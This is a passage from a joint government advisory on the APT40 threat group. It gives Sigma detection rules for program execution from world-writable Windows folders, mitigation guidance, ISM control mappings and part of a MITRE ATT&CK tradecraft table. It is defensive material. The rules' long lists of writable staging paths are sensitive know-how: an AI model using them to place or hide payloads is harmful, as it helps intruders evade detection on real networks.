<p>The&nbsp;ASD’s&nbsp;ACSC&nbsp;strongly&nbsp;recommends&nbsp;implementing&nbsp;the&nbsp;ASD&nbsp;<a href=\"https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/essential-eight\" title=\"Essential Eight\">Essential&nbsp;Eight</a>&nbsp;Controls&nbsp;and&nbsp;associated&nbsp;<a href=\"https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/strategies-mitigate-cyber-security-incidents/strategies-mitigate-cyber-security-incidents-mitigation-details\" title=\"Strategies&nbsp;to&nbsp;Mitigate&nbsp;Cyber&nbsp;Security&nbsp;Incidents\">Strategies&nbsp;to&nbsp;Mitigate&nbsp;Cyber&nbsp;Security&nbsp;Incidents</a>.&nbsp;Below are recommendations for network security actions that&nbsp;should&nbsp;be&nbsp;taken&nbsp;to&nbsp;detect&nbsp;and&nbsp;prevent&nbsp;intrusions by&nbsp;APT40,&nbsp;followed&nbsp;by&nbsp;specific&nbsp;mitigations&nbsp;for&nbsp;four&nbsp;key&nbsp;TTPs&nbsp;summarized&nbsp;in&nbsp;Table&nbsp;1.</p>
<h3>Detection</h3>
<p>Some of the files identified above were dropped in locations such as C:\\Users\\Public\\* and C:\\Windows\\ Temp\\*.&nbsp;These locations can be convenient spots for writing data as they are usually world writable, that is, all user accounts registered in Windows have access to these directories and their subdirectories. Often, any&nbsp;user&nbsp;can&nbsp;subsequently&nbsp;access&nbsp;these&nbsp;files,&nbsp;allowing opportunities for lateral movement, defense evasion, low-privilege execution and staging for exfiltration.</p>
<p>The&nbsp;following&nbsp;Sigma&nbsp;rules&nbsp;look&nbsp;for&nbsp;execution&nbsp;from suspicious locations as an indicator of anomalous activity.&nbsp;In&nbsp;all&nbsp;instances,&nbsp;subsequent&nbsp;investigation&nbsp;is required&nbsp;to&nbsp;confirm&nbsp;malicious&nbsp;activity&nbsp;and&nbsp;attribution.</p>
<table>
<tbody>
<tr>
<td>
<h5>Title:&nbsp;World&nbsp;Writable&nbsp;Execution&nbsp;-&nbsp;Temp</h5>
<p><strong>ID:&nbsp;</strong>d2fa2d71-fbd0-4778-9449-e13ca7d7505c</p>
<p><strong>Description: </strong>Detect process execution from C:\\ Windows\\Temp.</p>
<p><strong>Background: </strong>This&nbsp;rule&nbsp;looks&nbsp;specifically&nbsp;for&nbsp;execution&nbsp;out&nbsp;of&nbsp;C:\\ Windows\\Temp\\*.&nbsp;Temp&nbsp;is&nbsp;more&nbsp;broadly&nbsp;used&nbsp;by benign applications and thus a lower confidence malicious&nbsp;indicator&nbsp;than&nbsp;execution&nbsp;out&nbsp;of&nbsp;other&nbsp;world&nbsp;writable subdirectories in C:\\Windows.</p>
<p>Removing applications executed by the SYSTEM or NETWORK SERVICE users substantially reduces the quantity of benign activity selected by this rule.</p>
<p>This&nbsp;means&nbsp;that&nbsp;the&nbsp;rule&nbsp;may&nbsp;miss&nbsp;malicious&nbsp;executions&nbsp;at&nbsp;a&nbsp;higher&nbsp;privilege&nbsp;level&nbsp;but&nbsp;it&nbsp;is&nbsp;recommended&nbsp;to use&nbsp;other&nbsp;rules&nbsp;to&nbsp;determine&nbsp;if&nbsp;a&nbsp;user&nbsp;is&nbsp;attempting&nbsp;to elevate privileges to SYSTEM.</p>
<p><strong>Investigation:</strong></p>
<ol>
<li>Examine information directly associated with this file execution, such&nbsp;as&nbsp;the user&nbsp;context,&nbsp;execution integrity level, immediate follow-on activity and images loaded by the file.</li>
<li>Investigate&nbsp;contextual&nbsp;process,&nbsp;network,&nbsp;file and other supporting data on the host to help&nbsp;make&nbsp;an&nbsp;assessment&nbsp;as&nbsp;to&nbsp;whether&nbsp;the&nbsp;activity&nbsp;is&nbsp;malicious.</li>
<li>If&nbsp;necessary&nbsp;attempt&nbsp;to&nbsp;collect&nbsp;a&nbsp;copy&nbsp;of&nbsp;the&nbsp;file&nbsp;for&nbsp;reverse&nbsp;engineering&nbsp;to&nbsp;determine&nbsp;whether&nbsp;it&nbsp;is&nbsp;legitimate.</li>
</ol>
<p><strong>References:</strong></p>
<p><a href=\"https://www.elastic.co/guide/en/security/current/process-execution-from-an-unusual-directory.html\" title=\"Process Execution from an Unusual Directory\">Process Execution from an Unusual Directory</a></p>
<p><strong>Author:&nbsp;</strong>ASD’s ACSC</p>
<p><strong>Date:&nbsp;</strong>2024/06/19</p>
<p><strong>Status:&nbsp;</strong>experimental</p>
<p><strong>Tags:</strong></p>
<ul>
<li>tlp.green</li>
<li>classification.au.official</li>
<li>attack.execution</li>
</ul>
<p><strong>Log&nbsp;Source:</strong></p>
<p>category:&nbsp;process_creation<br>product:&nbsp;windows</p>
<p><strong>Detection:</strong></p>
<p>temp:<br>Image|startswith:&nbsp;'C:\\\\Windows\\\\Temp\\\\'</p>
<p>common_temp_path:<br>Image|re|ignorecase:&nbsp;'C:\\\\Windows\\\\Temp\\\\\\{[a-fA-F0-9]{8}-([a-fA-F0-9]{4}-){3}[a-fA-F0-9]{12}\\}\\\\'</p>
<p>system_user:<br>User:</p>
<ul>
<li>'SYSTEM'</li>
<li>'NETWORK&nbsp;SERVICE'</li>
</ul>
<p>dismhost:</p>
<ul>
<li>Image|endswith: 'dismhost.exe'&nbsp;</li>
</ul>
<p>known_parent:</p>
<ul>
<li>ParentImage|endswith:</li>
<li>'\\\\esif_uf.exe'&nbsp;</li>
<li>'\\\\vmtoolsd.exe'&nbsp;</li>
<li>'\\\\cwainstaller.exe'</li>
<li>'\\\\trolleyexpress.exe'</li>
</ul>
<p>condition: temp and not (common_temp_path or system_user or dismhost or known_parent)</p>
<p><strong>False positives:</strong></p>
<ul>
<li>Allowlist auditing applications have been observed running executables from Temp.</li>
<li>Temp will legitimately contain an array of setup applications and launchers, so it will be worth considering how prevalent this behavior is on a monitored network (and whether or not it can be allowlisted) before deploying this rule.</li>
</ul>
<p><strong>Level:</strong> low</p>
</td>
</tr>
</tbody>
</table>
<table>
<tbody>
<tr>
<td>
<h5>Title:&nbsp;World Writable Execution - Non-Temp System Subdirectory</h5>
<p><strong>ID:</strong> 5b187157-e892-4fc9-84fc-aa48aff9f997</p>
<p><strong>Description:</strong> Detect process execution from a world writable location in a subdirectory of the Windows OS install location.</p>
<p><strong>Background:</strong></p>
<p>This rule looks specifically for execution out of world writable directories within C:\\ and particularly C:\\Windows\\*, with the exception of C:\\Windows\\Temp (which is more broadly used by benign applications and thus a lower confidence malicious indicator).</p>
<p>AppData folders are excluded if a file is run as SYSTEM - this is a benign way in which many temporary application files are executed.</p>
<p>After completing an initial network baseline and identifying known benign executions from these locations, this rule should rarely fire.</p>
<p><strong>Investigation:</strong></p>
<ol>
<li>Examine information directly associated with this file execution, such as the user context, execution integrity level, immediate follow-on activity and images loaded by the file.</li>
<li>Investigate contextual process, network, file and other supporting data on the host to help make an assessment as to whether the activity is malicious.</li>
<li>If necessary attempt to collect a copy of the file for reverse engineering to determine whether it is legitimate.</li>
</ol>
<p><strong>References:</strong></p>
<p><a href=\"https://gist.github.com/mattifestation/5f9de750470c9e0e1f9c9c33f0ec3e56\" title=\"mattifestation / WorldWritableDirs.txt\">mattifestation / WorldWritableDirs.txt</a><br><a href=\"https://www.elastic.co/guide/en/security/current/process-execution-from-an-unusual-directory.html\" title=\"Process Execution from an Unusual Directory\">Process Execution from an Unusual Directory</a></p>
<p><strong>Author:</strong> ASD’s ACSC</p>
<p><strong>Date:</strong> 2024/06/19</p>
<p><strong>Status:</strong> experimental</p>
<p><strong>Tags:</strong></p>
<ul>
<li>tlp.green</li>
<li>classification.au.official</li>
<li>attack.execution</li>
</ul>
<p><strong>Log source:</strong></p>
<p>category: process_creation<br>product: windows</p>
<p><strong>Detection:</strong></p>
<p>writable_path:<br>Image|contains:</p>
<ul>
<li>':\\\\$Recycle.Bin\\\\'</li>
<li>':\\\\AMD\\\\Temp\\\\'</li>
<li>':\\\\Intel\\\\'</li>
<li>':\\\\PerfLogs\\\\'</li>
<li>':\\\\Windows\\\\addins\\\\'</li>
<li>':\\\\Windows\\\\appcompat\\\\'</li>
<li>':\\\\Windows\\\\apppatch\\\\'</li>
<li>':\\\\Windows\\\\AppReadiness\\\\'</li>
<li>':\\\\Windows\\\\bcastdvr\\\\'</li>
<li>':\\\\Windows\\\\Boot\\\\'</li>
<li>':\\\\Windows\\\\Branding\\\\'</li>
<li>':\\\\Windows\\\\CbsTemp\\\\'</li>
<li>':\\\\Windows\\\\Containers\\\\'</li>
<li>':\\\\Windows\\\\csc\\\\'</li>
<li>':\\\\Windows\\\\Cursors\\\\'</li>
<li>':\\\\Windows\\\\debug\\\\'</li>
<li>':\\\\Windows\\\\diagnostics\\\\'</li>
<li>':\\\\Windows\\\\DigitalLocker\\\\'</li>
<li>':\\\\Windows\\\\dot3svc\\\\'</li>
<li>':\\\\Windows\\\\en-US\\\\'</li>
<li>':\\\\Windows\\\\Fonts\\\\'</li>
<li>':\\\\Windows\\\\Globalization\\\\'</li>
<li>':\\\\Windows\\\\Help\\\\'</li>
<li>':\\\\Windows\\\\IdentityCRL\\\\'</li>
<li>':\\\\Windows\\\\IME\\\\'</li>
<li>':\\\\Windows\\\\ImmersiveControlPanel\\\\'</li>
<li>':\\\\Windows\\\\INF\\\\'</li>
<li>':\\\\Windows\\\\intel\\\\'</li>
<li>':\\\\Windows\\\\L2Schemas\\\\'</li>
<li>':\\\\Windows\\\\LiveKernelReports\\\\'</li>
<li>':\\\\Windows\\\\Logs\\\\'</li>
<li>':\\\\Windows\\\\media\\\\'</li>
<li>':\\\\Windows\\\\Migration\\\\'</li>
<li>':\\\\Windows\\\\ModemLogs\\\\'</li>
<li>':\\\\Windows\\\\ms\\\\'</li>
<li>':\\\\Windows\\\\OCR\\\\'</li>
<li>':\\\\Windows\\\\panther\\\\'</li>
<li>':\\\\Windows\\\\Performance\\\\'</li>
<li>':\\\\Windows\\\\PLA\\\\'</li>
<li>':\\\\Windows\\\\PolicyDefinitions\\\\'</li>
<li>':\\\\Windows\\\\Prefetch\\\\'</li>
<li>':\\\\Windows\\\\PrintDialog\\\\'</li>
<li>':\\\\Windows\\\\Provisioning\\\\'</li>
<li>':\\\\Windows\\\\Registration\\\\CRMLog\\\\'</li>
<li>':\\\\Windows\\\\RemotePackages\\\\'</li>
<li>':\\\\Windows\\\\rescache\\\\'</li>
<li>':\\\\Windows\\\\Resources\\\\'</li>
<li>':\\\\Windows\\\\SchCache\\\\'</li>
<li>':\\\\Windows\\\\schemas\\\\'</li>
<li>':\\\\Windows\\\\security\\\\'</li>
<li>':\\\\Windows\\\\ServiceState\\\\'</li>
<li>':\\\\Windows\\\\servicing\\\\'</li>
<li>':\\\\Windows\\\\Setup\\\\'</li>
<li>':\\\\Windows\\\\ShellComponents\\\\'</li>
<li>':\\\\Windows\\\\ShellExperiences\\\\'</li>
<li>':\\\\Windows\\\\SKB\\\\'</li>
<li>':\\\\Windows\\\\TAPI\\\\'</li>
<li>':\\\\Windows\\\\Tasks\\\\'</li>
<li>':\\\\Windows\\\\TextInput\\\\'</li>
<li>':\\\\Windows\\\\tracing\\\\'</li>
<li>':\\\\Windows\\\\Vss\\\\'</li>
<li>':\\\\Windows\\\\WaaS\\\\'</li>
<li>':\\\\Windows\\\\Web\\\\'</li>
<li>':\\\\Windows\\\\wlansvc\\\\'</li>
<li>':\\\\Windows\\\\System32\\\\Com\\\\dmp\\\\'</li>
<li>':\\\\Windows\\\\System32\\\\FxsTmp\\\\'</li>
<li>':\\\\Windows\\\\System32\\\\Microsoft\\\\Crypto\\\\RSA\\\\MachineKeys\\\\'</li>
<li>':\\\\Windows\\\\System32\\\\Speech\\\\'</li>
<li>':\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\'</li>
<li>':\\\\Windows\\\\System32\\\\spool\\\\PRINTERS\\\\'</li>
<li>':\\\\Windows\\\\System32\\\\spool\\\\SERVERS\\\\'</li>
<li>':\\\\Windows\\\\System32\\\\Tasks_Migrated\\\\Microsoft\\\\Windows\\\\PLA\\\\System\\\\'</li>
<li>':\\\\Windows\\\\System32\\\\Tasks\\\\'</li>
<li>':\\\\Windows\\\\SysWOW64\\\\Com\\\\dmp\\\\'</li>
<li>':\\\\Windows\\\\SysWOW64\\\\FxsTmp\\\\'</li>
<li>':\\\\Windows\\\\SysWOW64\\\\Tasks\\\\'</li>
</ul>
<p>appdata:<br>Image|contains:&nbsp;'\\\\AppData\\\\'<br>User:&nbsp;'SYSTEM'<br>condition:&nbsp;writable_path&nbsp;and&nbsp;not&nbsp;appdata</p>
<p><strong>False positives:</strong></p>
<p>Allowlist auditing applications have been observed running executables from these directories.</p>
<p>It is plausible that scripts and administrative tools used in the monitored environment(s) may be located in one of these directories and should be addressed on a case-by-case basis.</p>
<p><strong>Level:</strong> high</p>
</td>
</tr>
</tbody>
</table>
<table>
<tbody>
<tr>
<td>
<h5>Title:&nbsp;World Writable Execution - Users</h5>
<p><strong>ID:</strong> 6dda3843-182a-4214-9263-925a80b4c634</p>
<p><strong>Description:</strong> Detect process execution from C:\\Users\\Public\\* and other world writable folders within Users.</p>
<p><strong>Background:</strong></p>
<p>AppData folders are excluded if a file is run as SYSTEM - this is a benign way in which many temporary application files are executed.</p>
<p><strong>Investigation:</strong></p>
<ol>
<li>Examine information directly associated with this file execution, such as the user context, execution integrity level, immediate follow-on activity and images loaded by the file.</li>
<li>Investigate contextual process, network, file and other supporting data on the host to help make an assessment as to whether the activity is malicious.</li>
<li>If necessary attempt to collect a copy of the file for reverse engineering to determine whether it is legitimate.</li>
</ol>
<p><strong>References:</strong></p>
<p><a href=\"https://www.elastic.co/guide/en/security/current/process-execution-from-an-unusual-directory.html\" title=\"Process Execution from an Unusual Directory\">Process Execution from an Unusual Directory</a></p>
<p><strong>Author:</strong> ASD’s ACSC</p>
<p><strong>Date:</strong> 2024/06/19</p>
<p><strong>Status:</strong> experimental</p>
<p><strong>Tags:</strong></p>
<ul>
<li>tlp.green</li>
<li>classification.au.official</li>
<li>attack.execution</li>
</ul>
<p><strong>Log source:</strong></p>
<p>category: process_creation<br>product: windows</p>
<p><strong>Detection:</strong><br>users:<br>Image|contains:</p>
<ul>
<li>':\\\\Users\\\\All Users\\\\'</li>
<li>':\\\\Users\\\\Contacts\\\\'</li>
<li>':\\\\Users\\\\Default\\\\'</li>
<li>':\\\\Users\\\\Public\\\\'</li>
<li>':\\\\Users\\\\Searches\\\\'</li>
</ul>
<p>appdata:<br>Image|contains: '\\\\AppData\\\\'<br>User: 'SYSTEM'<br>condition: users and not appdata</p>
<p><strong>False positives:</strong></p>
<p>It is plausible that scripts and administrative tools used in the monitored environment(s) may be located in Public or a subdirectory and should be addressed on a case-by-case basis.</p>
<p><strong>Level:</strong> medium</p>
</td>
</tr>
</tbody>
</table>
<h3>Mitigations</h3>
<h5>Logging</h5>
<p>During ASD’s ACSC investigations, a common issue that&nbsp;reduces the effectiveness and speed of investigative efforts&nbsp;is&nbsp;a&nbsp;lack&nbsp;of&nbsp;comprehensive&nbsp;and&nbsp;historical&nbsp;logging&nbsp;information&nbsp;across&nbsp;a&nbsp;number&nbsp;of&nbsp;areas&nbsp;including web server request logs, Windows event logs&nbsp;and internet proxy logs.</p>
<p>ASD’s&nbsp;ACSC&nbsp;recommends&nbsp;reviewing&nbsp;and&nbsp;implementing their&nbsp;guidance&nbsp;on&nbsp;<a href=\"https://www.cyber.gov.au/resources-business-and-government/maintaining-devices-and-systems/system-hardening-and-administration/system-monitoring/windows-event-logging-and-forwarding\" title=\"Windows&nbsp;Event&nbsp;Logging&nbsp;and&nbsp;Forwarding\">Windows&nbsp;Event&nbsp;Logging&nbsp;and&nbsp;Forwarding</a>&nbsp;including the configuration files and scripts&nbsp;in the&nbsp;<a href=\"http://www.github.com/Australiancybersecuritycentre/windows_event_logging/\" title=\"Windows Event Logging Repository\">Windows Event Logging Repository</a>&nbsp;and the Information&nbsp;Security&nbsp;Manual’s&nbsp;<a href=\"http://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/ism/cyber-security-guidelines/guidelines-system-monitoring\" title=\"Guidelines&nbsp;for&nbsp;System&nbsp;Monitoring\">Guidelines&nbsp;for&nbsp;System&nbsp;Monitoring</a>, to include centralizing logs and retaining&nbsp;logs for a suitable period.</p>
<h5>Patch&nbsp;Management</h5>
<p>Promptly patch all internet exposed devices and&nbsp;services,&nbsp;including&nbsp;web&nbsp;servers,&nbsp;web&nbsp;applications,&nbsp;and&nbsp;remote access gateways. Consider implementing a centralized patch management system to automate and expedite the process. ASD’s ACSC recommend implementation&nbsp;of&nbsp;the&nbsp;ISM’s&nbsp;<a href=\"http://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/ism/cyber-security-guidelines/guidelines-system-management\" title=\"Guidelines&nbsp;for&nbsp;System&nbsp;Management\">Guidelines&nbsp;for&nbsp;System Management</a>, specifically, the System Patching&nbsp;controls where applicable.</p>
<p>Most exploits utilized by the actor were publicly known and had patches or mitigations available.</p>
<p>Organizations should ensure that security patches or mitigations&nbsp;are&nbsp;applied&nbsp;to&nbsp;internet&nbsp;facing&nbsp;infrastructure within 48 hours, and where possible, use the latest&nbsp;versions&nbsp;of&nbsp;software&nbsp;and&nbsp;operating&nbsp;systems.</p>
<h5>Network&nbsp;Segmentation</h5>
<p>Network segmentation can make it significantly more difficult for adversaries to locate and gain access to an organizations sensitive data. Segment networks to limit or block lateral movement by denying traffic between computers unless required. Important servers such as Active Directory and other authentication servers should only be able to be administered from a limited&nbsp;number of intermediary servers or “jump servers.” These servers should be closely monitored, be well secured&nbsp;and limit which users and devices are able to connect to&nbsp;them.</p>
<p>Regardless of instances identified where lateral movement is prevented, additional network&nbsp;segmentation&nbsp;could&nbsp;have&nbsp;further&nbsp;limited&nbsp;the amount&nbsp;of&nbsp;data&nbsp;the&nbsp;actors&nbsp;were&nbsp;able&nbsp;to&nbsp;access&nbsp;and&nbsp;extract.</p>
<h5>Additional Mitigations</h5>
<p>The&nbsp;authoring&nbsp;agencies&nbsp;also&nbsp;recommend&nbsp;the&nbsp;following mitigations to combat APT40 and others’ use of the&nbsp;TTPs&nbsp;below.</p>
<ul>
<li>Disable&nbsp;unused&nbsp;or&nbsp;unnecessary&nbsp;network&nbsp;services, ports&nbsp;and&nbsp;protocols.</li>
<li>Use&nbsp;well-tuned&nbsp;Web&nbsp;application&nbsp;firewalls&nbsp;(WAFs) to protect&nbsp;webservers&nbsp;and applications.</li>
<li>Enforce&nbsp;least privilege&nbsp;to limit&nbsp;access to&nbsp;servers,&nbsp;file shares, and other resources.</li>
<li>Use multi-factor authentication (MFA) and managed service accounts to&nbsp;make&nbsp;credentials harder to crack and reuse. MFA should be applied to&nbsp;all&nbsp;internet&nbsp;accessible&nbsp;remote&nbsp;access&nbsp;services,&nbsp;including:
<ul>
<li>Web&nbsp;and&nbsp;cloud-based&nbsp;email;</li>
<li>Collaboration&nbsp;platforms;</li>
<li>Virtual&nbsp;private&nbsp;network&nbsp;connections; and</li>
<li>Remote&nbsp;desktop&nbsp;services.</li>
</ul>
</li>
<li>Replace&nbsp;end-of-life&nbsp;equipment.</li>
</ul>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption>Mitigation Strategies/Techniques</caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>TTP</strong></th>
<th role=\"columnheader\"><strong>Essential&nbsp;Eight&nbsp;Mitigation&nbsp;Strategies</strong></th>
<th role=\"columnheader\"><strong>ISM&nbsp;Controls</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>Initial&nbsp;Access</p>
<p><a href=\"https://attack.mitre.org/techniques/T1190\" title=\"Exploit Public-Facing Application\">T1190</a></p>
<p>Exploitation of Public-Facing Application</p>
</td>
<td>
<ul>
<li>Patch&nbsp;applications</li>
<li>Patch&nbsp;operating&nbsp;systems</li>
<li>Multi-factor&nbsp;authentication</li>
<li>Application&nbsp;control</li>
</ul>
</td>
<td>
<p>ISM-0140</p>
<p>ISM-1698</p>
<p>ISM-1701</p>
<p>ISM-1921</p>
<p>ISM-1876</p>
<p>ISM-1877</p>
<p>ISM-1905</p>
</td>
</tr>
<tr>
<td>
<p>Execution</p>
<p><a href=\"https://attack.mitre.org/techniques/T1059\" title=\"Command and Scripting Interpreter\">T1059</a></p>
<p>Command&nbsp;and&nbsp;Scripting Interpreter</p>
</td>
<td>
<ul>
<li>Application&nbsp;control</li>
<li>Restrict&nbsp;Microsoft&nbsp;Office&nbsp;macros</li>
<li>Restrict&nbsp;administrative&nbsp;privileges</li>
</ul>
</td>
<td>
<p>ISM-0140</p>
<p>ISM-1490</p>
<p>ISM-1622</p>
<p>ISM-1623</p>
<p>ISM-1657</p>
<p>ISM-1890</p>
</td>
</tr>
<tr>
<td>
<p>Persistence</p>
<p><a href=\"https://attack.mitre.org/techniques/T1505/003\" title=\"Server Software Component: Web Shell\">T1505.003</a></p>
<p>Server&nbsp;Software Component:&nbsp;Web&nbsp;Shell</p>
</td>
<td>
<ul>
<li>Application&nbsp;Control</li>
<li>Restrict&nbsp;administrative&nbsp;privileges</li>
</ul>
</td>
<td>
<p>ISM-0140</p>
<p>ISM-1246</p>
<p>ISM-1746</p>
<p>ISM-1249</p>
<p>ISM-1250</p>
<p>ISM-1490</p>
<p>ISM-1657</p>
<p>ISM-1871</p>
</td>
</tr>
<tr>
<td>
<p>Initial&nbsp;Access /&nbsp;Privilege Escalation&nbsp;/&nbsp;Persistence</p>
<p><a href=\"https://attack.mitre.org/techniques/T1078/\" title=\"Valid Accounts\">T1078</a></p>
<p>Valid&nbsp;Accounts</p>
</td>
<td>
<ul>
<li>Patch&nbsp;operating&nbsp;systems</li>
<li>Multi-factor&nbsp;authentication</li>
<li>Restrict&nbsp;administrative&nbsp;privileges</li>
<li>Application&nbsp;control</li>
<li>User&nbsp;application&nbsp;hardening</li>
</ul>
</td>
<td>
<p>ISM-0140</p>
<p>ISM-0859</p>
<p>ISM-1546</p>
<p>ISM-1504</p>
<p>ISM-1679</p>
</td>
</tr>
</tbody>
</table>
<p>For additional general detection and mitigation advice, please consult the Mitigations and Detection sections on the MITRE ATT&amp;CK technique web page for each of the techniques identified in the MITRE ATT&amp;CK summary at the end of this advisory.</p>
<h2><strong>Reporting</strong></h2>
<p><strong>Australian organizations:</strong> visit <a href=\"https://www.cyber.gov.au/\" title=\"Australian Signals Directorate’s Australian Cyber Security Centre\">cyber.gov.au</a> or call 1300 292 371 (1300 CYBER 1) to report cybersecurity incidents and to access alerts and advisories.</p>
<p><strong>Canadian organizations:</strong> report incidents by emailing CCCS at <a href=\"mailto:contact@cyber.gc.ca\" title=\"Canadian Reporting\">contact@cyber.gc.ca</a>.</p>
<p><strong>New Zealand organizations:</strong> report cyber security incidents to <a href=\"mailto:incidents@ncsc.govt.nz\" title=\"New Zealand Reporting\">incidents@ncsc.govt.nz</a> or call 04 498 7654.</p>
<p><strong>United Kingdom organizations:</strong> report a significant cyber security incident at <a href=\"https://www.ncsc.gov.uk/section/about-this-website/contact-us\" title=\"United Kingdom Reporting\">National Cyber Security Centre</a> (monitored 24 hours) or, for urgent assistance, call 03000 200 973.</p>
<p><strong>U.S. organizations:</strong> report incidents and anomalous activity to CISA 24/7 Operations Center at <a href=\"mailto:report@cisa.gov\" title=\"Report to CISA\">report@cisa.gov</a> or (888) 282-0870 and/or to the FBI via your local FBI field office, the FBI’s 24/7 CyWatch at (855) 292-3937, or <a href=\"mailto:CyWatch@fbi.gov\" title=\"Report to FBI\">CyWatch@fbi.gov</a>. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.</p>
<h2><strong>Disclaimer</strong></h2>
<p>The information in this report is being provided “as is” for informational purposes only. The authoring agencies do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the authoring agencies.</p>
<h2><strong>MITRE ATT&amp;CK – Historical APT40 Tradecraft of Interest</strong></h2>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Reconnaissance (TA0043)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Search Victim-Owned Websites [T1594] &nbsp;</td>
<td>Gather Victim Identity Information: Credentials [T1589.001]&nbsp;</td>
</tr>
<tr>
<td>Active Scanning: Vulnerability Scanning [T1595.002]&nbsp;</td>
<td>Gather Victim Host Information [T1592]</td>
</tr>
<tr>
<td>Search Open Websites/Domains: Search Engines [T1593.002]</td>
<td>Gather Victim Network Information: Domain Properties [T1590.001]</td>
</tr>
<tr>
<td>Gather Victim Identity Information: Email Addresses [T1589.002]</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Resource Development (TA0042)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Acquire Infrastructure: Domains [T1583.001] &nbsp;</td>
<td>Acquire Infrastructure [T1583]</td>
</tr>
<tr>
<td>Acquire Infrastructure: DNS Server [T1583.002] &nbsp;</td>
<td>Compromise Accounts [T1586]</td>
</tr>
<tr>
<td>Develop Capabilities: Code Signing Certificates [T1587.002]&nbsp;</td>
<td>Compromise Infrastructure [T1584]</td>
</tr>
<tr>
<td>Develop Capabilities: Digital Certificates [T1587.003]&nbsp;</td>
<td>Develop Capabilities: Malware [T1587.001]</td>
</tr>
<tr>
<td>Obtain Capabilities: Code Signing Certificates [T1588.003]</td>
<td>Establish Accounts: Cloud Accounts [T1585.003]</td>
</tr>
<tr>
<td>Compromise Infrastructure: Network Devices [T1584.008]</td>
<td>Obtain Capabilities: Digital Certificates [T1588.004]</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Initial Access (TA0001)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Valid Accounts [T1078]&nbsp;</td>
<td>Phishing [T1566]</td>
</tr>
<tr>
<td>Valid Accounts: Default Accounts [T1078.001] &nbsp;</td>
<td>Phishing: Spearphishing Attachment [T1566.001] &nbsp;</td>
</tr>
<tr>
<td>Valid Accounts: Domain Accounts [T1078.002] &nbsp;</td>
<td>Phishing: Spearphishing Link [T1566.002]</td>
</tr>
<tr>
<td>External Remote Services [T1133]</td>
<td>Exploit Public-Facing Application [T1190]</td>
</tr>
<tr>
<td>Drive-by Compromise [T1189]&nbsp;</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Execution (TA0002)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Windows Management Instrumentation [T1047] &nbsp;</td>
<td>Command and Scripting Interpreter: Python [T1059.006]&nbsp;</td>
</tr>
<tr>
<td>Scheduled Task/Job: At [T1053.002]&nbsp;</td>
<td>Command and Scripting Interpreter: JavaScript [T1059.007]&nbsp;</td>
</tr>
<tr>
<td>Scheduled Task/Job: Scheduled Task [T1053.005] &nbsp;</td>
<td>Native API [T1106]&nbsp;</td>
</tr>
<tr>
<td>Command and Scripting Interpreter [T1059] &nbsp;</td>
<td>Inter-Process Communication [T1559]&nbsp;</td>
</tr>
<tr>
<td>Command and Scripting Interpreter: Windows Command Shell [T1059.003]&nbsp;</td>
<td>System Services: Service Execution [T1569.002] &nbsp;</td>
</tr>
<tr>
<td>Command and Scripting Interpreter: PowerShell [T1059.001]&nbsp;</td>
<td>Exploitation for Client Execution [T1203] &nbsp;</td>
</tr>
<tr>
<td>Command and Scripting Interpreter: Visual Basic [T1059.005]&nbsp;</td>
<td>User Execution: Malicious File [T1204.002] &nbsp;</td>
</tr>
<tr>
<td>Command and Scripting Interpreter: Unix Shell [T1059.004]</td>
<td>Command and Scripting Interpreter: Apple Script [T1059.002]</td>
</tr>
<tr>
<td>Scheduled Task/Job: Cron [T1053.003]</td>
<td>Software Deployment Tools [T1072]</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th colspan=\"2\" role=\"columnheader\" data-tablesaw-priority=\"persist\">Persistence (TA0003)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Valid Accounts [T1078]&nbsp;</td>
<td>Server Software Component: Web Shell [T1505.003]&nbsp;</td>
</tr>
<tr>
<td>Office Application Startup: Office Template Macros [T1137.001]</td>
<td>Create or Modify System Process: Windows Service [T1543.003]&nbsp;</td>
</tr>
<tr>
<td>Scheduled Task/Job: At [T1053.002]&nbsp;</td>
<td>Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder [T1547.001]&nbsp;</td>
</tr>
<tr>
<td>Scheduled Task/Job: Scheduled Task [T1053.005] &nbsp;</td>
<td>Boot or Logon Autostart Execution: Shortcut Modification [T1547.009]&nbsp;</td>
</tr>
<tr>
<td>External Remote Services [T1133]&nbsp;</td>
<td>Hijack Execution Flow: DLL Search Order Hijacking [T1574.001]&nbsp;</td>
</tr>
<tr>
<td>Scheduled Task/Job: Cron [T1053.003] &nbsp;</td>
<td>Hijack Execution Flow: DLL Side-Loading [T1574.002]&nbsp;</td>
</tr>
<tr>
